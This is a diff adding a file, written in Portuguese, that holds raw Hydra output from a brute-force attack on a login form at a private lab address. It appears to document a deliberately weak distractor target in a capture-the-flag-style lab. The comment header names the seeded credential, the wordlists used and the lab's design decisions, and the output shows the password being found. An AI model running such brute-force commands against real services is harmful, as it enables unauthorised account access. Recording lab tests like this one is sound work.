@@ -1,0 +1,28 @@
+# Saida bruta de hydra contra o formulario de login do host-glhf (distrator,
+# fora da cadeia -- ARTEFATO.md §2.2). Alvo legitimo: a GLHF e um artefato de
+# terceiro com falhas propositais proprias e uma senha fraca semeada na
+# imagem (usuario "root", senha "hashed", em texto puro no script de seed do
+# proprio projeto). Usada para provar que a ferramenta funciona contra um
+# alvo que DEVE ceder.
+#
+# NOTA DE 17 DE SETEMBRO (D49, D50). A `senhas.txt` desta captura foi escrita
+# a mao. A lista do laboratorio passou a ser a `probable-v2_top-207.txt` do
+# SecLists mais `hashed` na linha 208 -- a mesma senha, agora com procedencia
+# registrada. Refeito ao vivo em 17 de setembro com a lista nova: mesmo
+# resultado, `login: root password: hashed`.
+#
+# A distincao que D50 fixou: o §2.3 proibe senha quebravel por forca bruta
+# DENTRO da cadeia. A GLHF esta fora dela, e ceder aqui e o distrator
+# funcionando (§3.1) -- a credencial obtida nao da progresso rumo ao trofeu.
+# A `senhas.txt` desta linha de comando e a de 8 entradas arquivada ao lado,
+# em `senhas-das-capturas-13-09.txt`. NAO e a lista do laboratorio de hoje,
+# que tem 208 entradas e vive em /usr/share/wordlists/senhas.txt (D49, D50).
+$ hydra -l root -P senhas.txt 172.20.0.11 -s 1337 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-13 18:23:59
+[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
+[DATA] attacking http-post-form://172.20.0.11:1337/login:username=^USER^&password=^PASS^:F=Invalid credentials
+[1337][http-post-form] host: 172.20.0.11   login: root   password: hashed
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-13 18:23:59
